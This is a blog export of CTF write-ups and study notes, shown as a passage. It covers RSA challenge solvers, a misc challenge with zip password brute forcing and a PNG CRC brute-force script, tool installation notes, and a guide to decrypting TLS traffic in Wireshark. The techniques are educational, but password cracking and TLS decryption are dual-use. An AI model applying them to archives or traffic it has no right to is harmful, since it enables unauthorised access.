46327402297749589082353363703523801418931778189802600046922737992686461676413</span></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;YqcbT7kcyeciLpEE3YQuRsLzJk&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h1>ASR</h1>
<blockquote>
<p>Reference: [CryptoCTF2022]PolyRSA</p>
</blockquote>
<ul>
<li>Polynomial solving</li>
</ul>
<p><code>task.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genprime</span>():</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		r = getRandomNBitInteger(<span class="number">64</span>)</span><br><span class="line">		p = r**<span class="number">6</span> + <span class="number">8</span>*r**<span class="number">4</span> - <span class="number">41</span>*r**<span class="number">3</span> + <span class="number">14</span>*r**<span class="number">2</span> - <span class="number">116</span>*r + <span class="number">31387</span></span><br><span class="line">		q = r**<span class="number">5</span> - <span class="number">9</span>*r**<span class="number">4</span> + <span class="number">17</span>*r**<span class="number">3</span> - <span class="number">311</span>*r**<span class="number">2</span> - <span class="number">16</span>*r + <span class="number">14029</span></span><br><span class="line">		<span class="keyword">if</span> isPrime(p) <span class="keyword">and</span> isPrime(q):</span><br><span class="line">			<span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">flag, n</span>):</span><br><span class="line">	m = bytes_to_long(flag)</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">pow</span>(m, <span class="number">31337</span>, n)</span><br><span class="line"></span><br><span class="line">p, q = genprime()</span><br><span class="line">n = p * q</span><br><span class="line">c = enc(flag, n)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure>
<p><code>exp.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">73553176031506251642448229714220151174734540964434813056145000616720019024269982417494553771890010861489245572362590935764438928110836109730139595790550323300572059713433794357690270439325805603980903813396260703</span></span><br><span class="line">c = <span class="number">19209686331218755173713714974036153099675780768506975193406617712945126866438211292560144823093347834048813455853960982766572556698881387553177980003129346158494272297017876567974550982519632403844694686184532804</span></span><br><span class="line">e = <span class="number">31337</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Original_RSA</span>(<span class="params">p,q,e,c,n</span>):</span><br><span class="line">    N = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    d = <span class="built_in">int</span>(invert(e, N))</span><br><span class="line">    m = powmod(c, d, n)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line">r = Symbol(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">p = <span class="keyword">lambda</span> r: r ** <span class="number">6</span> + <span class="number">8</span> * r ** <span class="number">4</span> - <span class="number">41</span> * r ** <span class="number">3</span> + <span class="number">14</span> * r ** <span class="number">2</span> - <span class="number">116</span> * r + <span class="number">31387</span></span><br><span class="line">q = <span class="keyword">lambda</span> r: r ** <span class="number">5</span> - <span class="number">9</span> * r ** <span class="number">4</span> + <span class="number">17</span> * r ** <span class="number">3</span> - <span class="number">311</span> * r ** <span class="number">2</span> - <span class="number">16</span> * r + <span class="number">14029</span></span><br><span class="line">n0 = p(r) * q(r)</span><br><span class="line">f = n - n0</span><br><span class="line"><span class="comment"># print(f)</span></span><br><span class="line">sol = solve([f], [r])</span><br><span class="line">x = sol[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">p = mpz(p(x))</span><br><span class="line">q = mpz(q(x))</span><br><span class="line">m = Original_RSA(p, q, e, c, n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode())</span><br><span class="line"><span class="comment"># 642921858775320553662877496454459277194994123046130653667709</span></span><br><span class="line"><span class="comment"># flag&#123;G3t_m0re_fuN_RSA!!!&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># or sage to solve out p, q</span></span><br><span class="line">PR.&lt;k&gt; = PolynomialRing(ZZ) <span class="comment"># define k</span></span><br><span class="line">p = k**<span class="number">6</span> + <span class="number">7</span>*k**<span class="number">4</span> - <span class="number">40</span>*k**<span class="number">3</span> + <span class="number">12</span>*k**<span class="number">2</span> - <span class="number">114</span>*k + <span class="number">31377</span></span><br><span class="line">q = k**<span class="number">5</span> - <span class="number">8</span>*k**<span class="number">4</span> + <span class="number">19</span>*k**<span class="number">3</span> - <span class="number">313</span>*k**<span class="number">2</span> - <span class="number">14</span>*k + <span class="number">14011</span></span><br><span class="line">n0 = p*q</span><br><span class="line"><span class="comment"># k^11 - 8*k^10 + 26*k^9 - 409*k^8 + 451*k^7 + 10850*k^6 + 44939*k^5 - 158301*k^4 + 71237*k^3 - 9651273*k^2 - 2036532*k + 439623147</span></span><br><span class="line">f = n - n0</span><br><span class="line">sol = f.roots() <span class="comment"># solve the root of the equation</span></span><br><span class="line"><span class="comment"># print(sol)</span></span><br><span class="line"><span class="comment"># [(9291098683758154336, 1)]</span></span><br><span class="line">x = sol[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">p = p(x)</span><br><span class="line">q = q(x)</span><br></pre></td></tr></table></figure>
<h1>ezmisc</h1>
<blockquote>
<p>Download: <a href="ezmisc1.zip">ezmisc</a></p>
</blockquote>
<ul>
<li>Archive pseudo-encryption</li>
<li>Repair the file header</li>
<li>Extract the hidden files</li>
<li>Unzip nested packages</li>
<li>Properties area steganation &amp;&amp; Brute force</li>
<li>Blast file height or width</li>
</ul>
<h2 id="Archive-pseudo-encryption">Archive pseudo-encryption</h2>
<blockquote>
<p>Winhex</p>
</blockquote>
<p>Use winhex to find <code>504B0102</code>, and the keypoint <code>09</code> which is the 5th behind the <code>504B0102</code>. Edit it to <code>00</code> and unzip the zip.</p>
<img src="/2022/11/16/22-11-16-YD/1.jpg" class="" title="Edit and unzip">
<p>And get the output <code>1.png</code>.</p>
<h2 id="Repair-the-file-header">Repair the file header</h2>
<blockquote>
<p>Winhex</p>
</blockquote>
<p>Find the <code>1.png</code> cannot open well. Check the file header, we find that the header is <code>000000000D0A1A0A</code> which is different to <code>89504E470D0A1A0A</code>. Thus, use winhex to edit and get the real <code>1.png</code>.</p>
<img src="/2022/11/16/22-11-16-YD/1.png" class="" title="1.png">
<h2 id="Extract-the-hidden-files">Extract the hidden files</h2>
<blockquote>
<p>binwalk</p>
<p>foremost</p>
</blockquote>
<p>Use binwalk to check if there are hidden files in the picture. If yes, and we execute the foremost to get the hidden files.</p>
<p><em>Make the <strong>output</strong> file empty!</em></p>
<h2 id="Unzip-nested-packages">Unzip nested packages</h2>
<blockquote>
<p>ExtractNow</p>
<p>Download: <a href="ExtractNow_V4.8.3.0.zip">ExtractNow</a></p>
</blockquote>
<p>After using the tool <code>ExtractNow</code>, we get the <code>flag.zip</code> and <code>password.zip</code> both of which are encrypted.</p>
<h2 id="Properties-area-steganation-Brute-force">Properties area steganation &amp;&amp; Brute force</h2>
<blockquote>
<p>ARCHPR</p>
</blockquote>
<p>From the <code>password.zip</code> 's properties, we get the hint that <code>8 digits</code>. We brute the zip’s password by ARCHPR.</p>
<p>Unzip the <code>password.zip</code>, we get the <code>password.txt</code>. By this dictionary, we can also brute the <code>flag.zip</code> by ARCHPR and obtain the final picture <code>flag.png</code>.</p>
<h2 id="Blast-file-height-or-width">Blast file height or width</h2>
<blockquote>
<p>stegsolve</p>
<p>python</p>
<p>winhex</p>
</blockquote>
<p>By the <code>stegsolve</code>, we can make a conclusion that the picture’s height or width has been edited from the <code>Calculated CRC</code>.</p>
<img src="/2022/11/16/22-11-16-YD/2.png" class="" title="stegsolve_check">
<p>Use a script for blasting, remember that the script has its rules.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hexstr2bytes</span>(<span class="params">s</span>):</span><br><span class="line">    b = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s), <span class="number">2</span>):</span><br><span class="line">        temp = s[i:i+<span class="number">2</span>]</span><br><span class="line">        b += struct.pack(<span class="string">&#x27;B&#x27;</span>, <span class="built_in">int</span>(temp, <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">str1 = <span class="string">&#x27;49484452&#x27;</span>   <span class="comment"># HEX/IHDR</span></span><br><span class="line">str2 = <span class="string">&#x27;0802000000&#x27;</span> <span class="comment"># Bit depth，ColorType，Compression method，Filter method，Interlace method</span></span><br><span class="line">bytes1 = hexstr2bytes(str1)</span><br><span class="line">bytes2 = hexstr2bytes(str2)</span><br><span class="line">wid, hei = <span class="number">507</span>, <span class="number">507</span>  <span class="comment"># width height</span></span><br><span class="line"></span><br><span class="line">crc32 = <span class="string">&#x27;0xe440b49a&#x27;</span> <span class="comment"># CRC32</span></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(wid, wid+<span class="number">2000</span>):</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(hei, hei+<span class="number">2000</span>):</span><br><span class="line">        width = <span class="built_in">hex</span>(w)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        height = <span class="built_in">hex</span>(h)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        bytes_tmp = hexstr2bytes(width+height)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">eval</span>(<span class="built_in">hex</span>(zlib.crc32(bytes1+bytes_tmp+bytes2))) == <span class="built_in">eval</span>(crc32):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">hex</span>(w), <span class="built_in">hex</span>(h))</span><br><span class="line">            </span><br><span class="line"><span class="comment"># 0x260 0x1fb</span></span><br></pre></td></tr></table></figure>
<p>Edit the width, and we will get the true <code>flag.png</code>.</p>
<img src="/2022/11/16/22-11-16-YD/flag.png" class="" title="true_flag">
]]></content>
      <categories>
        <category>Studying</category>
      </categories>
      <tags>
        <tag>RSA</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>22-12-07-2022CnHoneKe</title>
    <url>/2022/12/07/22-12-07-2022CnHoneKe/</url>
    <content><![CDATA[<p>The competition was held in August.</p>
<p>The exercises except <code>factor2</code> are done. And the article is mainly aim to make a record for myself. The <code>Modus</code> is about the multiplicative homomorphic system, which is similar to the <code>Extended Euclidean algorithm</code>.</p>
<p><strong>List</strong></p>
<ul>
<li>[x] Modus</li>
<li>[x] rsa</li>
<li>[ ] factor2</li>
<li>[x] secret_data</li>
</ul>
<p>Wish I can solve out above.</p>
<span id="more"></span><!--toc-->
<h1>Modus</h1>
<ul>
<li>multiplicative_homomorphic</li>
</ul>
<p><strong>output.txt</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">14142010206099386143235977555692857399310494373372334255226213043954222671886219214790080363755519983589419573494262932031062165425660149023699589427423291076757673539031113758789961660789969074666728548356143546954548237178966812807683542026090314756465049840269239582841323515153189937744280883895942616355068450477244038093783025761830910527817275117470273068582606801561816182028771714266926279491448124072638544823523354972471012076902504991756879694948477398253632905720027515230565063830199860044535605314432273647912553716877788661706091962626029470938285869557993283863813783012548154763397158585969860496209</span></span><br><span class="line">e1 = <span class="number">8044170206501208651566242545498471362911890649958881015968520025930186294576023443506808099677296038797758573489705294289102108150592764180571398770862282775413964383616485564171756065468610971753771700993772575426420613330938626182989999507422559869431997096499661057456703567386749182728255894961711</span></span><br><span class="line">c1 = <span class="number">11517322714245526592044873592382373283428914348422645739336159016405003731268657488015847458779166523731678788259036486197351408324218938844963108776390284845014868126098529982171539875948326597563481747612010865265679909207769244324752454968172401384300433252342047155447253514663020084257315172025978213587941036806257025876560069777775117798912056950800470305039358493009376541529192357082470617915062674822440632959240104574498373020678875137349967659371746447815516349204225897744273956308472359601558104152900628002351072193856499370256139818744736463310402972428459727204523498170929275318085749369313370330104</span></span><br><span class="line">e2 = <span class="number">7981110843177277522743262582712207767500318326009118362192817529414323700650435360291001887232564132664914694220334201133850645107707193720930288877874115700468049318771691746592219604611120450612600603061311788240065247605723819417162805390035814213048743243801428908542140081097421519822132590047533</span></span><br><span class="line">c2 = <span class="number">12907231513900923422005862146378905589636791955213455533815625546155661275692081099543894853443339737652933422555561840945917851059973294781475696342510739464313686827430856742266071924616860913810640580296234473777303348248031669837803543965896443694327322478656672147536068477193332582821244877632320706358476947499828283809012293724747791713411303065091158644428874828519807586496004634361827049528190857803358038226873772036022804215684911051370929474550764142943510840488678370689581686370179457811111602201500802245275266633124851078915997894235280935026230159846619929979668248511374747926732890795947582868735</span></span><br><span class="line">e3 = <span class="number">8321945773137532897701269832287423438330975369722946793416731752574708023263908693097168458920645511451157398450278461406044452962800707032660103849647429968263806321843635237930345258217128805872313308435747131438472827261934005675575066641207582827978944766548998867180054428477087525524476746729443</span></span><br><span class="line">c3 = <span class="number">14065425026445215199826296511184881258323064633386950509660192854866326626040354040592178906620984652169865998063876885421774133239148395916412178848784041317916589243316140373118461629430419305769180856968279675982734449182890302977853892881391084830333333875116598959777525928574769839174695101654696531535920235825780434207646161363349309470260223615977113109458426965856166705879375711518022880712089324008258280991081209228374850515248942548172463741894540420262751207821783524890116559086561517224038086473047623408064157594299815732082781632190258405091440187576055868450259807171733509904666142689629066721239</span></span><br></pre></td></tr></table></figure>
<p><strong>Analyse</strong></p>
<p>When I see the <code>output.txt</code>, the first thing appeared in my mind is the <code>SameModAttack</code>, using the <code>Extended-Extended Euclidean algorithm</code>. :)</p>
<p>Obviously it is wrong, and the correct solution is to use the <code>multiplicative homomorphic properties</code>.</p>
<p>From the <code>output</code>, we can get a condition that <code>gcd(e1, e2, e3) = 1</code>. Using the <code>Extended Euclidean algorithm</code> we can get $gcdext(a, b) \Longrightarrow gcd(a, b) = r * a + s * b$.</p>
<p>By deduction, we will get the relation that:<br>
$$<br>
gcd(e1, e2) \equiv e1 * r1 + e2 * s1<br>
$$</p>
<p>$$<br>
gcd(gcd(e1, e2), e3) \equiv gcd(e1, e2) * r2 + e3 * s2<br>
$$</p>
<p>$$<br>
\Longrightarrow 1 \equiv (e1 * r1 + e2 * s1) * r2 + e3 * s2<br>
$$</p>
<p>Using this important equation, we can deduce the plaintext:<br>
$$<br>
c1^{r1 \cdot r2} * c2^{r2 \cdot s1} * c3^{s3} \mod n<br>
$$</p>
<p>$$<br>
\Longrightarrow m^{e1\cdot r1 \cdot r2 + e2 \cdot r2 \cdot s1 + e3 \cdot s2} \equiv m \mod n<br>
$$</p>
<p>And we can solve out the important <code>m</code>.</p>
<p><strong><a href="http://exp.py">exp.py</a></strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">g1, r1, s1 = gcdext(e1, e2)</span><br><span class="line">g2, r2, s2 = gcdext(g1, e3)</span><br><span class="line"><span class="built_in">print</span>(g2)</span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line">m = powmod(c1, r1*r2, n)*powmod(c2, r2*s1, n)*powmod(c3, s2, n) % n</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># 158364088221424626103916028957988006099747465255174624548375855659785449250446255975244653061928080738353296765</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode())</span><br><span class="line"><span class="comment"># CnHongKe&#123;e4d0e72e-7589-46a5-973a-cb2a561ab9b5&#125;</span></span><br></pre></td></tr></table></figure>
<h1>rsa</h1>
<ul>
<li>Euler function 2</li>
<li>fermat factor</li>
</ul>
<p><strong><a href="http://task.py">task.py</a></strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p1 = getPrime(<span class="number">256</span>)</span><br><span class="line">p2 = gmpy2.next_prime(p1)</span><br><span class="line">q1 = getPrime(<span class="number">256</span>)</span><br><span class="line">q2 = gmpy2.next_prime(q1)</span><br><span class="line">n = p1 * p2 * q1 * q2</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;n = %s&quot;</span> % <span class="built_in">str</span>(n)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;c = %s&quot;</span> % <span class="built_in">str</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 64167976067579049714960625453369319623574147507612434283986049223337768780480307767872484679214997588434480836733456745370562072077109044069294552424055163225824033286416753073591864962033181307822913035174676405849974928866646899569297852568167037383571518655075260561571463850326020102574832776970253538663</span></span><br><span class="line"><span class="comment"># c = 61862798948167945139222097835309318688214053098609025632041946354708220281670731577734398373186075525909035569024535800893559811995294302363408878574730352951360726686941143742759917076156204564133401228995322937563878389120770732315714920284214472911769619065607001763986611359218449802649142381309774537696</span></span><br></pre></td></tr></table></figure>
<p><strong>Analyse</strong></p>
<p>From the code, we can make a conclusion that the <code>p1</code> and <code>p2</code> are primes which are neighbors, and the <code>q1</code> and <code>q2</code> are the same.</p>
<p>At this time, we can use <code>fermat factor</code> to solve out the different <code>p1</code>, <code>p2</code>, <code>q1</code> and <code>q2</code>.</p>
<p>The <code>n</code>  is <code>Composite number</code> , so we will use <code>Euler function 2</code> to solve out $\varphi(n)$.</p>
<p>We use <code>fermat factor</code> to make a possible list and make sure that the <code>n = p1 * p2 * q1 * q2</code></p>
<h1>factor2</h1>
<h1>secret_data</h1>
<ul>
<li>change and fix the data</li>
<li>convert data to zip</li>
<li>zip to xlsx</li>
<li>kali-grep to find the flag</li>
</ul>
]]></content>
      <categories>
        <category>Studying</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>cnhongke</tag>
        <tag>multiplicative_homomorphic</tag>
      </tags>
  </entry>
  <entry>
    <title>22-11-15-math</title>
    <url>/2022/11/15/22-11-15-math/</url>
    <content><![CDATA[<span id="more"></span><!--toc-->
<h1>Fermat’s little theorem</h1>
<p>Let $p$ be a prime number,  and $a$ be any integer. Then $a^{p} - a$ is always divisible by $p$.</p>
<p>And we can write as:<br>
$$<br>
a^{p} \equiv a \mod p<br>
$$<br>
Make a deduction, we can get that:<br>
$$<br>
a^{p-1} \equiv 1 \mod p<br>
$$</p>
]]></content>
      <categories>
        <category>Studying</category>
      </categories>
      <tags>
        <tag>math</tag>
      </tags>
  </entry>
  <entry>
    <title>22-12-15-gaps</title>
    <url>/2022/12/15/22-12-15-gaps/</url>
    <content><![CDATA[<p>The gap is aim to complete the puzzle.</p>
<span id="more"></span><!--toc-->
<h1>INSTALL</h1>
<ul>
<li>git clone <a href="https://github.com/nemanja-m/gaps.git">https://github.com/nemanja-m/gaps.git</a></li>
<li>cd gaps</li>
<li>pip3 install -r requirements.txt</li>
<li>python3 <a href="http://setup.py">setup.py</a> install</li>
</ul>
<h1>REQUIREMENT</h1>
<p>If <code>pip3 install -r requirements.txt</code> failed, make sure that your environments match the <code>requirements.txt</code>.</p>
<ul>
<li><code>pip3 install numpy</code></li>
<li><code>pip3 install opencv-python</code></li>
<li><code>pip3 install pytest</code></li>
<li><code>pip3 install matplotlib</code></li>
<li><code>pip3 install pillow</code></li>
</ul>
<h1>SETUP</h1>
<p>If run <code>python3 setup.py install</code> failed, maybe you have no permit. So run <code>sudo su</code> and <code>python3 setup.py install</code> again.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Using /usr/lib/python3/dist-packages</span><br><span class="line">Finished processing dependencies <span class="keyword">for</span> gaps==<span class="number">1.0</span></span><br></pre></td></tr></table></figure>
<p>Finally, the install is success.</p>
]]></content>
      <categories>
        <category>Studying</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title>22-12-14-docker-record</title>
    <url>/2022/12/14/22-12-14-docker-record/</url>
    <content><![CDATA[<p>I want to learn the docker to compile my environment. But this week   I have no time to make full studying.</p>
<p>Thus, I make a record which made by <code>Dalao-Zimablue</code>  in this post.</p>
<span id="more"></span><!--toc-->
<p><a href="https://www.zimablue.life/2022/02/10/Docker%E5%AD%A6%E4%B9%A0/#more">https://www.zimablue.life/2022/02/10/Docker学习/#more</a></p>
]]></content>
      <categories>
        <category>Studying</category>
      </categories>
  </entry>
  <entry>
    <title>22-12-19-basecrack</title>
    <url>/2022/12/19/22-12-19-basecrack/</url>
    <content><![CDATA[<p>The guidance to install the <code>basecrack</code>.</p>
<span id="more"></span><!--toc-->
<h1>INSTALL</h1>
<blockquote>
<p><a href="https://github.com/mufeedvh/basecrack/">https://github.com/mufeedvh/basecrack/</a></p>
</blockquote>
<ul>
<li>git clone <a href="https://github.com/mufeedvh/basecrack.git">https://github.com/mufeedvh/basecrack.git</a></li>
<li>cd basecrack</li>
<li>pip3 install -r requirements.txt</li>
<li>python3 <a href="http://basecrack.py">basecrack.py</a> -h</li>
</ul>
<p><em>python2 may get error</em></p>
<h2 id="Support">Support</h2>
<p>Recently:</p>
<ul>
<li>Base16</li>
<li>Base32</li>
<li>Base36</li>
<li>Base58</li>
<li>Base62</li>
<li>Base64</li>
<li>Base64Url</li>
<li>Base85</li>
<li>Ascii85</li>
<li>Base91</li>
<li>Base92</li>
<li>Base100</li>
</ul>
<h1>USAGE</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">usage: basecrack.py [-h] [-b BASE] [-f FILE] [-m] [-i IMAGE] [-c] [-e] [-o OUTPUT]</span><br><span class="line"></span><br><span class="line">options:</span><br><span class="line">  -h, --<span class="built_in">help</span>            show this <span class="built_in">help</span> message <span class="keyword">and</span> exit</span><br><span class="line">  -b BASE, --base BASE  Decode a single encoded base <span class="keyword">from</span> argument.</span><br><span class="line">  -f FILE, --file FILE  Decode multiple encoded bases <span class="keyword">from</span> a file.</span><br><span class="line">  -m, --magic           Decode multi-encoded bases <span class="keyword">in</span> one shot.</span><br><span class="line">  -i IMAGE, --image IMAGE</span><br><span class="line">                        Decode base encodings <span class="keyword">from</span> image <span class="keyword">with</span> OCR detection <span class="keyword">or</span> EXIF data.</span><br><span class="line">  -c, --ocr             OCR detection mode.</span><br><span class="line">  -e, --exif            EXIF data detection mode. (default)</span><br><span class="line">  -o OUTPUT, --output OUTPUT</span><br><span class="line">                        Generate a wordlist/output <span class="keyword">with</span> the decoded bases, enter filename</span><br><span class="line">                        <span class="keyword">as</span> the value.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1>EXAMPLE</h1>
<p><a href="base.txt">base</a></p>
<blockquote>
<p>The <code>base.txt</code> is a muti-base, which use base32-&gt;base64-&gt;base64-&gt;base32-&gt;base92-&gt;base100.</p>
</blockquote>
<p>The <code>basecrack</code> now supports the base100. And we can  use the command to solve the problem.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 basecrack.py -f <span class="string">&quot;xxx/base.txt&quot;</span> -m</span><br><span class="line"><span class="comment"># if is just a ciphertext</span></span><br><span class="line"><span class="comment"># python3 basecrack.py -b &quot;ciphertext&quot;</span></span><br></pre></td></tr></table></figure>
<p>The main output:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[-] Iteration: <span class="number">6</span>                                                                             </span><br><span class="line">[-] Heuristic Found Encoding To Be: Base32                                                   </span><br><span class="line">[-] Decoding <span class="keyword">as</span> Base32: This_is_So_S1mple                                                    </span><br><span class="line">&#123;&#123;&lt;&lt;======================================================================&gt;&gt;&#125;&#125;               </span><br><span class="line">[-] Total Iterations: <span class="number">6</span>                                                                      </span><br><span class="line">[-] Encoding Pattern: Base100 -&gt; Base92 -&gt; Base32 -&gt; Base64 -&gt; Base64 -&gt; Base32              </span><br><span class="line">[-] Magic Decode Finished With Result: This_is_So_S1mple                                     </span><br><span class="line">[-] Finished <span class="keyword">in</span> <span class="number">0.0019</span> seconds                         </span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Studying</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title>22-12-20-Encrypto-Wireshark</title>
    <url>/2022/12/20/22-12-20-Encrypto-Wireshark/</url>
    <content><![CDATA[<p>Some traffic packets may be encrypted. When I import the private key in one case, I can’t get the decrypted packets like http.</p>
<p>FinalIy, I search for this problem and get the solution.</p>
<p>This post aims to make a conclusion about the <code>encrypted-traffic-packets(tls/ssl)</code>.</p>
<span id="more"></span><!--toc-->
<h1>REFERENCE</h1>
<blockquote>
<p><a href="https://www.cnblogs.com/jasy/p/16157388.html">https://www.cnblogs.com/jasy/p/16157388.html</a></p>
<p><a href="https://www.joji.me/zh-cn/blog/walkthrough-decrypt-ssl-tls-traffic-https-and-http2-in-wireshark/#md-sslkeylogfile">如何通过Wireshark查看HTTPS、HTTP/2网络包（解码TLS、SSL） (joji.me)</a></p>
</blockquote>
<p>Really thank for the article!</p>
<p><em>The second is to edit the configuration of computer, which can be caught in the direct way by using webshell.</em></p>
<h1>DECRYPT TLS/SSL</h1>
<p>There are three methods to decrypt the encrypted-ssl/tls packets.</p>
<ul>
<li>Use the <code>server's cert</code> or the <code>private-key</code> to decrypt.</li>
<li>Use the <code>ssl-key-log-file</code> to decrypt.</li>
<li>Disable the config setting to decrypt packets which use the <code>Diffie-Hellman-Exchange</code>.</li>
</ul>
<h2 id="Server’s-cert-Private-key">Server’s cert/Private-key</h2>
<h3 id="preparation">preparation</h3>
<ul>
<li>TLS/SSL packets</li>
<li>cert or private-key</li>
<li>wireshark</li>
</ul>
<h3 id="notice">notice</h3>
<p>The TLS/SSL packets should not relate to the <code>Diffie-Hellman-Exchange</code> and just a common encrypted packets.</p>
<h4 id="CERT-PRIVATEKEY">CERT/PRIVATEKEY</h4>
<p>The cert or private-key should not be encrypted. And usually, the private-key is the standard of <code>PKCS#8</code>.</p>
<p>If you have a binary DER, it cannot be used in wireshark, and we ought to make a convert.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">openssl pkcs8 -nocrypt -<span class="keyword">in</span> der.key -informat DER -out pem.key -outformat PEM</span><br></pre></td></tr></table></figure>
<ul>
<li><em>der.key: the name and root of DER</em></li>
<li><em>pem.key: the output file</em></li>
</ul>
<p>And, the private-key ought to be like this:</p>
<img src="/2022/12/20/22-12-20-Encrypto-Wireshark/1.png" class="" title="Private-key">
<p>which shows that the beginning is <code>-----BEGIN RSA PRIVATE KEY-----</code>.</p>
<h4 id="DECRYPT-KEY">DECRYPT KEY</h4>
<blockquote>
<p><a href="https://www.openssl.org/docs/manmaster/man1/rsa.html#EXAMPLES">/docs/manmaster/man1/rsa.html (openssl.org)</a></p>
</blockquote>
<p>If the beginning is <code>-----BEGIN ENCRYPTED PRIVATE KEY-----</code>, we should decrypt the key in a proper way.</p>
<p>a common command is:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">openssl rsa -<span class="keyword">in</span> [source file] -out [outfile]</span><br><span class="line"><span class="comment"># ?Maybe.</span></span><br></pre></td></tr></table></figure>
<h3 id="step">step</h3>
<ul>
<li>OPEN the wireshark and import the private-key or cert.</li>
</ul>
<img src="/2022/12/20/22-12-20-Encrypto-Wireshark/2.png" class="" title="setting">
<ol>
<li><strong>RSA keys list.</strong> Import private key, add the <code>port</code>, <code>ip</code>, <code>protocol</code>, <code>root</code> and the chosen <code>password</code>. <strong>Mainly used.</strong></li>
<li><strong>TLS debug file.</strong> Some debug file.</li>
<li><strong>Master-Secret log.</strong> Key log file.</li>
</ol>
<ul>
<li>If all things right, and we will see the <code>http traffic</code>.</li>
</ul>
<h2 id="Key-log-file">Key log file</h2>
<p>Use the <code>key log file</code>. Usually, this file is in the traffic packets. The key log file is like this.</p>
<img src="/2022/12/20/22-12-20-Encrypto-Wireshark/3.png" class="" title="key log file">
<h2 id="Relate-to-D-H">Relate to D-H</h2>
<p>Sometimes, the encrypted traffic packets cannot be decrypted by using methods above.</p>
<h3 id="how-to-recognize">how to recognize</h3>
<p>When we analyze the traffic packets, we use command like <code>ip.addr == xxx.xxx.xxx.xxx &amp;&amp; tls</code> to find the target packets.</p>
<p>If we see the <code>Client Hello</code>, we should make a notice that it maybe a <code>D-H encrypted traffic packet</code>.</p>
<p>For example:</p>
<img src="/2022/12/20/22-12-20-Encrypto-Wireshark/4.png" class="" title="D-H encrypted">
<p>We can change the browser to catch the traffic again.</p>
<h3 id="set-the-firefox">set the firefox</h3>
<p>The address is <code>about:config</code>, and search for the <code>dhe</code>.</p>
<p>We can change the target according to the traffic packets or make all things   <code>false</code>.</p>
<img src="/2022/12/20/22-12-20-Encrypto-Wireshark/5.png" class="" title="change firefox setting">
